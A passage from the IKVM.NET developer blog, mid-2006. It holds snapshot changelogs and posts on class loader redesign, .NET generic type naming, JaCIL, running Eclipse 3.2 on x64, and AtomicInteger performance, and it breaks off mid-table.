<LI>Moved compilation options from static properties of JVM class to instance properties of ClassLoaderWrapper.</LI>
<LI>Did a little cleanup/reorganization of ikvmc.</LI>
<LI>Patched runtime/MemberWrapper.cs to work around gmcs bug.</LI>
<LI>Patched awt/toolkit.cs to work around gmcs bug.</LI>
<LI>Moved AotTypeWrapper static fields to CompilerClassLoader instance fields.</LI>
<LI>Removed TypeWrapper.Assembly property.</LI>
<LI>Fixed WeakReference tracker to use a WeakTrackResurrection handle, to be able to enqueue weak references that are only reachable via a finalizer or are resurrected.</LI>
<LI>Changed file.encoding system property from hardcoded 8859_1 to using System.Text.Encoding.Default.WebName.</LI></UL>
<P>Source is in cvs. Binaries: <A href="http://www.frijters.net/ikvmbin-0.31.2439.zip">ikvmbin-0.31.2439.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/05/2006 07:17:14 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=89f34de3-1fdb-4325-95fd-1106c4829670"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=89f34de3-1fdb-4325-95fd-1106c4829670">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 21 August 2006</h2></div>
<div class="newsItems"><a name="a9e17870b-ac2a-4c6b-ba30-332ce4042566"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>I fixed an ikvmstub regression introduced in the previous snapshot and fixed AssemblyClassLoader.getPackage[s]. I did some class file fuzzing and fixed most differences between JDK 1.5 and IKVM (most are trivial and only fixed to reduce the noise in the fuzz differences, but I also found a couple of real bugs).</P>
<P>Other changes:</P>
<UL>
<LI>Fixed runtime class loading to handle class loaders that return null or the wrong class.</LI>
<LI>Fixed Constructor to prevent instantiating Enum objects.</LI>
<LI>Fixed ikvmc not to stop with error when encountering invalid .class files. Also, when it encounters a .class file in a zip or jar that does not start with the Java class magic value it will include the .class file as a resource.</LI>
<LI>Improved ikvmc warnings about invalid classes to include the filename.</LI>
<LI>Fixed class file parser to correctly check the class file minor version.</LI>
<LI>Fixed field and method name validation in class file parser.</LI>
<LI>Fixed class file parser to check length of Deprecated attribute.</LI>
<LI>Fixed class file parser to check length of InnerClasses attribute when class file version is &gt;= 49.</LI>
<LI>Fixed class file parser to always validate NameAndType constant pool entries.</LI>
<LI>Fixed class file parser to check for maximum method size of 65535 instead of 65536.</LI>
<LI>Fixed class file parser to check some properties of exception handler tables (instead of doing that at verification time).</LI>
<LI>Fixed reflection (Class.getDeclaredMethods) to throw ClassFormatError or VerifyError.</LI>
<LI>Fixed handling of inner class modifier flags to always use the flags from the inner classes attribute, except for the accessibility flags.</LI>
<LI>Fixed verifier/compiler to emit methods that throw ClassFormatError, instead of only VerifyError.</LI>
<LI>Fixed verifier to disallow exception handlers starting at bytecode offset zero.</LI>
<LI>Fixed verifier to better check invokeinterface.</LI></UL>
<P>Source is in cvs. Binaries: <A href="http://www.frijters.net/ikvmbin-0.31.2424.zip">ikvmbin-0.31.2424.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/21/2006 07:24:22 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9e17870b-ac2a-4c6b-ba30-332ce4042566"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9e17870b-ac2a-4c6b-ba30-332ce4042566">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 18 August 2006</h2></div>
<div class="newsItems"><a name="a026244f2-b26e-4c48-bf52-b4d08c400569"></a><div class="entry">
	<h3 class="entryTitle">Breaking Changes</h3>
	<div class="entryBody">
		<P>Now that 0.30 has been released, it's time to talk about the next version. While 0.30 was baking, I've made some significant changes. People sometimes ask me why the version number is so low, part of the reason is that I anticipate that I'll need to make breaking changes a couple more times.</P>
<P><B>Moved Runtime API to IKVM.GNU.Classpath.dll</B></P>
<P>To make the runtime API easier to use and to allow (potential) future changes that remove the need for IKVM.Runtime.dll to discover IKVM.GNU.Classpath.dll, I moved the public API of the runtime into IKVM.GNU.Classpath.dll. Now, IKVM.Runtime.dll still exposes a bunch of public types, but you should not use any of these, they are "undocumented" and only for use by ikvmc generated code and IKVM.GNU.Classpath.dll. They will also change in future versions.</P>
<P><B>Revisiting the ClassLoader per Assembly Idea</B></P>
<P>Over the past couple of years I've slowly come around on my initial decision to have all classes in assemblies appear to be loaded by the boot class loader. My initial reluctance was mostly due to the fact that using a ClassLoader per assembly would require violating the ClassLoader delegation model, but the success of OSGi (which does the same) demonstrates that this isn't such a big deal.</P>
<P>Here are some of the advantages:</P>
<UL>
<LI>Each assembly will be its own namespace, meaning that things like Class.forName() and Class.getResource() will be able to search the calling assembly first, so you won't get into class or resource name conflicts as easily.</LI>
<LI>It removes the need for the hack that returns the system class loader, instead of null, for statically compiled classes.</LI>
<LI>It allows for many operations to be more efficient.</LI>
<LI>It removes the need for pre-loading assemblies to make Class.forName() work, because the assembly class loader will be able to search all referenced assemblies (i.e. ikvmc's -reference option will be honored by the assembly class loader).</LI>
<LI>You will be able to take full advantage of .NET assembly namespace separation (i.e. multiple versions of a jar can be compiled and used in the same AppDomain, by different pieces of code).</LI>
<LI>It allows for a more natural integration of ReflectionOnly support (when running a .NET 2.0 build of ikvmc or ikvmstub).</LI></UL>
<P>I made a new snapshot that you can play around with to evaluate how the change will impact you. <B>Please let me know</B>, now's the time to convince me to change some of the details ;-)</P>
<P>Here's a full list of changes in this snapshot:</P>
<UL>
<LI>Changed class loader architecture to represent each .NET assembly with its own class loader.</LI>
<LI>Changed system class loader to the application entry assembly class loader (except if the java.class.path system property is explicitly set, then you get a URL class loader that loads from the specified class path).</LI>
<LI>Ported stub class generator from C# to Java and incorporated it into IKVM.GNU.Classpath.dll.</LI>
<LI>Hooked up assembly class loader resource loading with stub generator, to support loading .class stub files for .NET and statically compiled classes.</LI>
<LI>Changed ikvmstub to create stub classes by simply loading them as resources.</LI>
<LI>Removed IKVM.Runtime.Util methods that existed for ikvmstub.</LI>
<LI>Fixed runtime/ikvmc to no longer depend on the CLR interning string literals.</LI>
<LI>Runtime no longer locks the class loader instance before calling loadClass.</LI>
<LI>Removed old mono bug work arounds from jni code.</LI>
<LI>Class.getProtectionDomain() now returns a more meaningful ProtectionDomain (including a CodeSource) for statically compiled Java code and .NET assemblies.</LI>
<LI>Moved VMSystem.setIn/setOut/setErr implementation from C# to Java.</LI>
<LI>Changed the way final instance fields are handled (added a private setter method to the property) to remove the need for the runtime to correlate the field with the property.</LI>
<LI>Fixed final field property accessor generator to make sure that the generated method name doesn't clash with other methods.</LI>
<LI>Moved IKVM.Runtime public API to IKVM.GNU.Classpath (and renamed to namespace and method names to follow Java naming convention).</LI>
<LI>Set system property to disable usage of Graphics 2D by Swing implementation.</LI>
<LI>Added java.vendor.url.bug, java.runtime.name and java.runtime.version system properties.</LI></UL>
<P>Source is in cvs. Binaries can be downloaded here: <A href="http://www.frijters.net/ikvmbin-0.31.2421.zip">ikvmbin-0.31.2421.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/18/2006 11:09:00 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=026244f2-b26e-4c48-bf52-b4d08c400569"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=026244f2-b26e-4c48-bf52-b4d08c400569">Comments [5]</a>
		
		<br clear="all">
	</div>
</div><a name="a6fa30b45-d645-425c-a737-42b033dcbb4f"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.30 Released</h3>
	<div class="entryBody">
		<P>I released 0.30 (same bits as last week's rc1) to <A href="http://sourceforge.net/project/showfiles.php?group_id=69637">SourceForge</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/18/2006 10:02:31 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=6fa30b45-d645-425c-a737-42b033dcbb4f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=6fa30b45-d645-425c-a737-42b033dcbb4f">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 10 August 2006</h2></div>
<div class="newsItems"><a name="a1dc95041-eadf-4851-a504-6e854a31814e"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.30 rc1</h3>
	<div class="entryBody">
		<P>Here's the release candidate. Updated japi results are available <A href="http://www.frijters.net/ikvm-japi-status.html">here</A>.<BR><BR>Changes since previous snapshot:
<UL>
<LI>Integrated <A href="http://www.gnu.org/software/classpath/announce/20060809.html">GNU Classpath 0.92</A>.</LI>
<LI>Fixed ikvmc to handle constructorless classes correctly.</LI>
<LI>Fixed a couple of FileChannelImpl bugs.</LI></UL>
<P>Files are available here: <A href="http://www.frijters.net/ikvm-0.30.0.0.zip">ikvm-0.30.0.0.zip</A> (sources + binaries), <A href="http://www.frijters.net/ikvmbin-0.30.0.0.zip">ikvmbin-0.30.0.0.zip</A> (binaries), <A href="http://www.frijters.net/ikvmbin-generics-0.30.0.0.zip">ikvmbin-generics-0.30.0.0.zip</A> (binaries built from generics branch)<BR></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/10/2006 10:38:07 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1dc95041-eadf-4851-a504-6e854a31814e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1dc95041-eadf-4851-a504-6e854a31814e">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 03 August 2006</h2></div>
<div class="newsItems"><a name="ab84710c1-bb3c-43eb-9993-2adceb166932"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>I'm preparing for the 0.30 release and this time I decided to do things a little more structured, so I made a branch in cvs: v0_30. I checked out the code into a clean directory changed allsources.lst and classpath.build to point to a clean check out of the GNU Classpath 0.92 release branch (Note that 0.92 has not yet been released) and ran the build script.<BR><BR>The resulting binaries are available <A href="http://www.frijters.net/ikvmbin-0.29.2406.zip">here</A>. Note that even though the directory inside the zip is ikvm-0.30.0.0, this is not yet 0.30, but instead should be considered a development snapshot and the binaries are unsigned and have version 0.29.*.<BR><BR>Please test this version and report any bugs, now's the time to get them fixed before 0.30 is released!<BR><BR>Here's what's new:
<UL>
<LI>Integrated GNU Classpath 0.92-pre</LI>
<LI>Implemented java.util.concurrent.atomic.AtomicInteger, AtomicIntegerArray, AtomicReference, AtomicReferenceArray, java.util.concurrent.locks.LockSupport and the sun.misc.Unsafe and sun.reflect.Reflection classes required by java.util.concurrent.</LI>
<LI>Added support for Thread parking (as required by j.u.c.l.LockSupport) to VMThread.</LI>
<LI>Added support for ldind.ref, stind.i2, stind.i4, stind.ref and ldelema CIL instruction to remapper.</LI>
<LI>Fixed volatile long/double access to be atomic.</LI>
<LI>Implemented VM specific part of RuntimeMXBean.</LI>
<LI>Implemented VMNetworkInterface using System.Management (via reflection to make sure the code continues to "work" on Mono which doesn't have a System.Management implementation) based on code submitted by Rich Naylor.</LI>
<LI>Implemented DatagramSocket multicast join/leave [implemented by Rich Naylor]</LI>
<LI>Added exception handler to app.config settings reading to ignore exceptions when app.config is invalid.</LI>
<LI>Added support to ikvmstub to generate annotations for custom attributes (but support is limited to a few simple custom attribute signatures currently).</LI>
<LI>Moved assembly attributes from map.xml to AssemblyInfo.java</LI>
<LI>Moved ThreadStatic and DllImport attributes from map.xml to source.</LI>
<LI>Added support for applying assembly attributes (by way of the "assembly" placeholder class).</LI>
<LI>Fixed IsSideEffectFreeStaticInitializer to handle unused class literals and invalid class files.</LI>
<LI>Removed -Xbootclasspath support (it wasn't compatible with Sun and the implementation was very hacky).</LI>
<LI>Cleaned up ikvmstub class loading.</LI>
<LI>Fixed ReflectionOnly (when compiling for WHIDBEY target) bug when handling generic byref method parameters.</LI>
<LI>Fixed DynamicClassLoader.CreateModuleBuilder() to have it return the ikvmc target assembly instead of creating a new assembly.</LI>
<LI>Centralized array type construction.</LI>
<LI>Fixed cli.System.Void.class literal to yield cli.System.Void instead of void type (this also fixes ikvmstub to generate cli.System.Void instead of void when processing mscorlib).</LI>
<LI>Restructured class loading to remove DynamicClassLoader subclass and use delegation instead.</LI>
<LI>Fixed Socket and DatagramSocket to ignore timeout on write operations (reported by David Pirkle).</LI>
<LI>Fixed Socket and DatagramSocket to throw UnknownHostException when dealing with an unresolved SocketAddress.</LI>
<LI>Fixed VMFile.mkdir not to throw exception when trying to create an invalid directory name.</LI>
<LI>Fixed ArrayIndexOutOfBoundsException when trying to load class named "[[".</LI>
<LI>Fixed VMStackWalker.getClassContext() to skip one less frame [this fix makes Eclipse 3.2 start up].</LI>
<LI>Added a hack to prevent the x64 JIT from doing tail call optimizations.</LI>
<LI>Changed IKVM.GNU.Classpath.dll build script to use classpath.security file from GNU Classpath instead of ikvm specific version.</LI>
<LI>Much improved ReflectionOnly support (WHIDBEY target only).</LI>
<LI>Added a CompilationRelaxations assembly attribute to fix a bug that occurred when IKVM.Runtime.dll or ikvmc.exe were NGENed. The code relies on string literals being interned by the CLR, but starting with .NET 2.0 the C# compiler by default annotates the assemblies it generates with the CompilationRelaxations(CompilationRelaxations.NoStringInterning) attribute.</LI>
<LI>Relaxed class name restrictions for 1.5 class files.</LI>
<LI>Added support for Java classes with a Finalize() method (there was a know bug that the generated Finalize stub that calls the real finalize() method would conflict with a user defined Finalize() method).</LI>
<LI>Removed IkvmStubMode hack.</LI>
<LI>Changed naming and loading of CLR generic types.</LI>
<LI>Implemented the remaining 1.5 methods in java.lang.Class.</LI>
<LI>Added consistency checks to Class.getDeclaringClass() and Class.getDeclaredClasses().</LI>
<LI>Simplified loading of "manufactured" nested classes (i.e. the nested Method interface in delegates and the Annotation annotation in attributes).</LI>
<LI>Changed generic type instantiations to have a custom class loader that delegates to the class loaders that were used to create the type (at least when there are no type name clashes).</LI>
<LI>Cleaned up warning generation in ikvmc and added -nowarn option to suppress specific warnings.</LI>
<LI>Fixed volatile read/write on WHIDBEY target build of ikvmc.</LI>
<LI>Made array type construction more lazy. Constructing large dimensional array types is now much faster.</LI>
<LI>Changed ClassLoader.findLoadedClass() to be compatible with 1.5 instead of 1.4 (i.e. it no longer creates new array types).</LI>
<LI>Fixed compiler to mark methods that use getstatic/putstatic on fields in another class as not inlineable (because the instructions are effectively a method call when they trigger the static initializer).</LI>
<LI>Fixed compiler to mark methods that use dynamic getstatic/putstatic/getfield/putfield instructions as not inlineable.</LI>
<LI>Improved optimization in compiler that omits line number table from methods that cannot throw exceptions. It now understands that getfield/putfield on the this reference and getstatic/putstatic on the current class cannot throw.</LI>
<LI>Fixed a bug in exception handling that could cause a TypeInitializationException to turn into a ClassCastException.</LI>
<LI>Added cause exception to NoClassDefFoundError that gets thrown when a type that failed its static initializer is accessed again.</LI></UL>
<P></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/03/2006 18:31:36 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b84710c1-bb3c-43eb-9993-2adceb166932"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b84710c1-bb3c-43eb-9993-2adceb166932">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 01 August 2006</h2></div>
<div class="newsItems"><a name="aac53c545-1134-4d0c-aff1-a355ad05524b"></a><div class="entry">
	<h3 class="entryTitle">.NET Generic Types</h3>
	<div class="entryBody">
		<P>Recently I changed the way .NET generic types are handled by IKVM. The previous scheme was based on a naive mangling of the .NET Type.FullName property, but that turned out to be problematic for various reasons. The first obvious reason was that type names often were way too long for comfort. For example:<BR><CODE><BR>Type t = typeof(System.Collections.Generic.List&lt;string&gt;);<BR>Console.WriteLine(t.FullName);<BR>Console.WriteLine(((java.lang.Class)t).getName());<BR></CODE><BR>With IKVM 0.28 this prints out:<BR><CODE><BR>System.Collections.Generic.List`1[[System.String, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]<BR>cli.System.Collections.Generic.List$$00601$$005B$$005B System$$002EString$$002C$$0020mscorlib$$002C$$0020 Version$$003D2$$002E0$$002E0$$002E0$$002C$$0020 Culture$$003Dneutral$$002C$$0020 PublicKeyToken$$003Db77a5c561934e089$$005D$$005D</CODE><BR><BR>(I manually inserted some spaces to make the HTML wrap.)<BR><BR>This obviously isn't very practical, but there is also a deeper problem. This literal translation of the name misses the fact that class loading in .NET is fundamentally different from class loading in Java. Which means that it is easy to go from Type to class name, but given a class name it is much harder to construct the corresponding type, especially if on or more of the type parameters are Java types (or remapped types).<BR><BR>In the next release the class name will be:<BR><BR><CODE>cli.System.Collections.Generic.List$$00601_$$$_Ljava__lang__String_$$$$_</CODE><BR><BR>Not only more readable, but it also correctly reflects the fact that System.String is known as java.lang.String on the Java side.<BR><BR>I also changed the way these names are resolved to be more inline with the way Java works. The name is now parsed by the class loader that first tries to load the class which then in turn loads the component classes and constructs the generic type from that. This means that the following code will now work (if you can somehow convince your Java compiler to compile it):<BR><BR><CODE>import cli.System.Collections.Generic.*;<BR><BR>class Test<BR>{<BR>&nbsp; public static void main(String[] args)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; List$$00601_$$$_LTest_$$$$_ list = new List$$00601_$$$_LTest_$$$$_();<BR>&nbsp;&nbsp;&nbsp; list.Add(new Test());<BR>&nbsp; }<BR>}</CODE><BR><BR>With the previous scheme there was no way to refer to the Test class in the generic class name, but now the correct class loader is used so you can refer to Java classes as well. That leaves only one question, what does <CODE>list.getClass().getClassLoader()</CODE> return? Well, for the time being I've decided to automatically construct a class loader that delegates to the defining class loaders of the classes used to construct the generic type, this ensures (as long as no types with the same names are used) that all types used in the definition of the generic type instance can be loaded by its class loader. It isn't actually clear to me that this is required, but at least for the time being it is, because some of the reflection code relies on this fact.<BR><BR>Finally, as a reminder, all this stuff is still experimental and, frankly, not intended to be practical. The main reason this support exists is to make the life of reflection/ikvmstub easier, otherwise the runtime would have to have all sorts of complicated support to deal with field types and method parameter/return types that take generic type instantiations.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/01/2006 15:11:32 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ac53c545-1134-4d0c-aff1-a355ad05524b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ac53c545-1134-4d0c-aff1-a355ad05524b">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 24 July 2006</h2></div>
<div class="newsItems"><a name="a06b361aa-2702-41ca-881d-5c774a1c9623"></a><div class="entry">
	<h3 class="entryTitle">JaCIL</h3>
	<div class="entryBody">
		<P>Almann Goo released version <A href="http://sourceforge.net/project/showfiles.php?group_id=166087">0.6.0.0</A> of <A href="http://www.cs.rit.edu/~atg2335/project/quickstart.php">JaCIL</A> on Saturday. The goal of JaCIL is basically to be a reverse ikvmc, it converts .NET assemblies into Java jars.<BR><BR>The binary distribution includes a couple of demos. Naturally I had to try and run them on IKVM :-) I ran into two known IKVM bugs, the first being that JaCIL generates a <MODULE>class and prior to Java 1.5 this wasn't a valid class name, but since Java 1.5 the class name space has been significantly enlarged, almost all checks have been removed. The second bug was that Java classes with both a Finalize() and finalize() method would be compiled incorrectly (under the covers IKVM generates a Finalize() method that overrides System.Object::Finalize and calls java.lang.Object::finalize), I've added support for this by renaming the generated Finalize method when it is necessary.<BR><BR>JaCIL isn't yet at the point where it can compile the ikvmc generated assembly[*], but maybe we'll eventually be able to run Java on .NET on Java on .NET on Java on .NET on Java... ;-)<BR><BR>[*] If you try it, you'll likely to run into an IKVM limitation. JaCIL is a .NET application and uses an ikvmc compiled version of <A href="http://forge.objectweb.org/projects/asm/">ObjectWeb ASM</A> and currently, IKVM.Runtime.dll gets confused if multiple versions of IKVM.GNU.Classpath.dll are loaded in the AppDomain.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/24/2006 14:18:39 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=06b361aa-2702-41ca-881d-5c774a1c9623"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=06b361aa-2702-41ca-881d-5c774a1c9623">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 12 July 2006</h2></div>
<div class="newsItems"><a name="a8e8deb4e-e96a-4dd5-8a69-a44d3ee7115b"></a><div class="entry">
	<h3 class="entryTitle">Eclipse 3.2 x64</h3>
	<div class="entryBody">
		<P>The Eclipse 3.2 release also includes an "early access" version for Windows x64 (among other 64 bit platforms), so I decided to try to run this version on IKVM. 
<P>While trying this I discovered a <A href="http://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=162364">bug</A> in the 64 bit version of the CLR. It doesn't respect MethodImpl(MethodImplOptions.NoInlining) and this means that Eclipse fails to start up, because it still does that <A href="/PermaLink.aspx?guid=245f4ca5-0512-4e66-a6c6-fa4d4af697ef">weird stack walking</A> to make sure that a particular method is called by the expected caller. BTW, instead of using the stack trace from an exception, they now use a subclass of SecurityManager and call <A href="http://java.sun.com/j2se/1.5.0/docs/api/java/lang/SecurityManager.html#getClassContext()">getClassContext</A> on that. That mechanism is a little better, but it is&nbsp;still incredibly lame. 
<P>The good news is that after adding a hack to IKVM to insert some extra junk in that particular method that prevents it from being inlined, Eclipse 3.2 x64 seems to run&nbsp;fine on IKVM. 
<P>Coincidentally, Eclipse 3.2 doesn't work on IKVM 0.28.0.1, because my implementation of getClassContext returned one stack frame too few (the GNU Classpath VMStackWalker interface is somewhat inconsistent, the other two methods in it both skip two frames, but getClassContext is apparantly only supposed to skip one frame).</P>
<P><EM><STRONG>Update:</STRONG> I got an e-mail from someone on the CLR team and he explained that the observed behaviour is by design. The method is not inlined, but the JIT optimizes the call into a tail call, thereby removing the stack frame from the call stack. Strictly speaking this is indeed&nbsp;a legal optimization, but I have to say I don't really see the point, if I wanted a tail call I would have used the tail call instruction.</EM></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/12/2006 16:59:45 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=8e8deb4e-e96a-4dd5-8a69-a44d3ee7115b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=8e8deb4e-e96a-4dd5-8a69-a44d3ee7115b">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 05 July 2006</h2></div>
<div class="newsItems"><a name="a2a6cb588-97b9-4c43-9fd6-40980298199d"></a><div class="entry">
	<h3 class="entryTitle">Eclipse Java Compiler</h3>
	<div class="entryBody">
		<P>The recent Eclipse 3.2 release&nbsp;includes a release of the stand alone Eclipse Java Compiler (they call it the JDT Core Batch Compiler). It is available as <A href="http://download3.eclipse.org/eclipse/downloads/drops/R-3.2-200606291905/download.php?dropFile=ecj.jar">ecj.jar</A>.</P>
<P>I switched to using this version for building GNU Classpath. If you want to use the same version, simply download ecj.jar and run it through ikvmc.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/05/2006 17:23:41 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2a6cb588-97b9-4c43-9fd6-40980298199d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2a6cb588-97b9-4c43-9fd6-40980298199d">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 15 June 2006</h2></div>
<div class="newsItems"><a name="a9af9d111-a4c2-425f-a2f8-52396d634668"></a><div class="entry">
	<h3 class="entryTitle">Custom Attributes as Annotations</h3>
	<div class="entryBody">
		I implemented partial and experimental support for applying .NET Custom Attributes in Java code as annotations. The following example now works:<BR>
<P><CODE><BR>import cli.System.Runtime.InteropServices.DllImportAttribute;</CODE></P>
<P><CODE>class beep<BR>{<BR>&nbsp; @DllImportAttribute.Annotation("kernel32")<BR>&nbsp; private static native int Beep(int dwFreq, int dwDuration);<BR><BR>&nbsp; public static void main(String[] args)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; for (int i = 1000; i &lt; 3000; i += 200)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Beep(i, 50);<BR>&nbsp; }<BR>}<BR></CODE> 
<P>I realise that the name of the annotation type is a bit ugly, but it's consistent with the way delegates are handled and it enables efficient handling of custom attributes at runtime (when compiling code in dynamic mode) and doesn't require access to the ikvmstub generated stub classes. 
<P>At the moment only attributes that have a zero arg or single string arg constructor are supported and attribute fields or properties are not exposed. 
<P>The Annotation inner interface cannot be used for anything except annotating. If you try to implement it or declare variables or parameters of its type, you will get internal errors in IKVM.Runtime.dll (because there is no corresponding .NET type). I will probably fix this at some point, but for now simply don't use that type except for annotating. 
<P>Finally, even though the Annotation annotation type is marked as Retention(RetentionPolicy.RUNTIME), it won't be visible through Java reflection. It's complicated to make this work and the value of it is limited. As an alternative, you can use .NET reflection to access the custom attributes.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/15/2006 14:31:25 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=9af9d111-a4c2-425f-a2f8-52396d634668"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=9af9d111-a4c2-425f-a2f8-52396d634668">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 08 June 2006</h2></div>
<div class="newsItems"><a name="a5d870240-407c-4504-983d-4c65c87aa954"></a><div class="entry">
	<h3 class="entryTitle">More AtomicInteger Performance</h3>
	<div class="entryBody">
		<P>In my <A HREF="/PermaLink.aspx?guid=7882b136-400e-4a01-aa8d-8113031f85f7">previous entry</A> on AtomicInteger I showed timings on my single CPU ThinkPad which has a 1.7 GHz Pentium M. Today I investigated the performance on my iMac which has a 1.83 GHz Core Duo and like the ThinkPad runs Windows XP SP2.</P>
<P>I've also modified AtomicInteger to take advantage of <A href="http://msdn2.microsoft.com/en-us/dd78zt0c.aspx">Interlocked.Increment</A>, <A href="http://msdn2.microsoft.com/en-us/1z4b2e5y.aspx">Decrement</A> and <A href="http://msdn2.microsoft.com/en-us/d3fxt78a.aspx">Exchange</A>. Instead of following the reference implementation which builds everything on top of the compareAndSet operation.</P>
<P>Running the same test produces the following numbers:</P>
<TABLE id=table1 border=1>
<TBODY>
<TR>
<TD>&nbsp;</TD>
<TD>Time (ms)</TD></TR>
<TR>
